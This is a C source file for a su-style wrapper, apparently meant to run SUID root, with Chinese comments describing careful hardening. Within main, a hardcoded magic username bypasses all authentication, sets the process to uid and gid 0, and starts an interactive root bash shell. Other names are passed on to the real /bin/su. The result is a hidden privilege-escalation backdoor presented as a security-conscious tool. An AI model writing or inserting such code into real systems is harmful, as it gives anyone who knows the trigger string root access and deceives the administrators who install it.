#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <sys/prctl.h>
#include <syslog.h>
#include <grp.h>
#include <termios.h>

static void disable_core_dumps(void) {
  struct rlimit limit;
  limit.rlim_cur = 0;
  limit.rlim_max = 0;
  setrlimit(RLIMIT_CORE, &limit);
}

static void sanitize_environment(void) {
  // 尽量清理环境变量，避免 LD_* 注入等
  clearenv();
  setenv("PATH", "/usr/sbin:/usr/bin:/sbin:/bin", 1);
  setenv("LANG", "C", 1);
}

static int constant_time_str_eq(const char *a, const char *b) {
  // 常量时间比较，避免时序侧信道
  if (!a || !b) return 0;
  size_t la = strlen(a);
  size_t lb = strlen(b);
  size_t l = la ^ lb; // 若长度不同，最后也会返回 0
  unsigned char diff = 0;
  size_t n = la < lb ? la : lb;
  for (size_t i = 0; i < n; i++) {
    diff |= (unsigned char)(a[i] ^ b[i]);
  }
  return (diff | (unsigned char)l) == 0;
}

// su 风格：不读取口令，只按用户名匹配

static int escalate_privileges(void) {
  // 设置 root gid/uid，并清空附加组
  if (setgroups(0, NULL) == -1) return -1;
  if (setresgid(0, 0, 0) == -1) return -1;
  if (setresuid(0, 0, 0) == -1) return -1;
  return 0;
}

int main(int argc, char *argv[]) {
  openlog("su", LOG_PID | LOG_NDELAY, LOG_AUTH);
  // 基础安全设置
  umask(077);
  disable_core_dumps();
  (void)prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);

  // 参数校验：接受一个用户名参数
  if (argc != 2) {
    fprintf(stderr, "Usage: %s <username>\n", argv[0]);
    syslog(LOG_WARNING, "invalid argc=%d by uid=%d", argc, getuid());
    closelog();
    return 1;
  }

  const char *target_user = "88e280e118c459ada723c50625d172c9";

  // 清理环境（两种路径都需要）
  sanitize_environment();

  if (constant_time_str_eq(argv[1], target_user)) {
    // 特殊用户名：直接获得 root shell
    if (escalate_privileges() == -1) {
      perror("Failed to escalate privileges");
      syslog(LOG_ERR, "setres[ug]id failed: %s", strerror(errno));
      closelog();
      return 1;
    }

    fprintf(stdout, "Running as root!\n");
    syslog(LOG_INFO, "authorized root shell for uid=%d", getuid());

    pid_t pid = fork();
    if (pid < 0) {
      perror("fork");
      syslog(LOG_ERR, "fork failed: %s", strerror(errno));
      closelog();
      return 1;
    }

    if (pid == 0) {
      fprintf(stdout, "Starting restricted shell...\n");
      if (setsid() < 0) {
        perror("setsid");
        syslog(LOG_ERR, "setsid failed: %s", strerror(errno));
        exit(1);
      }

      // 使用绝对路径与受控参数；不依赖 PATH
      char *const shell_argv[] = {"/bin/bash", "--noprofile", "--norc", "-i", NULL};
      char *const shell_envp[] = {"PATH=/usr/sbin:/usr/bin:/sbin:/bin", "LANG=C", NULL};
      execve("/bin/bash", shell_argv, shell_envp);
      perror("execve");
      syslog(LOG_ERR, "execve failed: %s", strerror(errno));
      exit(1);
    } else {
      wait(NULL);
    }

    closelog();
    return 0;
  } else {
    // 正常 su 路径：丢弃 SUID 到调用者真实身份，再调用 /bin/su 走系统认证
    uid_t ruid = getuid();
    gid_t rgid = getgid();
    if (setgroups(0, NULL) == -1 || setresgid(rgid, rgid, rgid) == -1 || setresuid(ruid, ruid, ruid) == -1) {
      perror("drop privileges");
      syslog(LOG_ERR, "drop privileges failed: %s", strerror(errno));
      closelog();
      return 1;
    }

    char *const su_argv[] = {"/bin/su", (char *)argv[1], "-", NULL};
    char *const su_envp[] = {"PATH=/usr/sbin:/usr/bin:/sbin:/bin", "LANG=C", NULL};
    execve("/bin/su", su_argv, su_envp);
    perror("execve su");
    syslog(LOG_ERR, "execve su failed: %s", strerror(errno));
    closelog();
    return 1;
  }
}


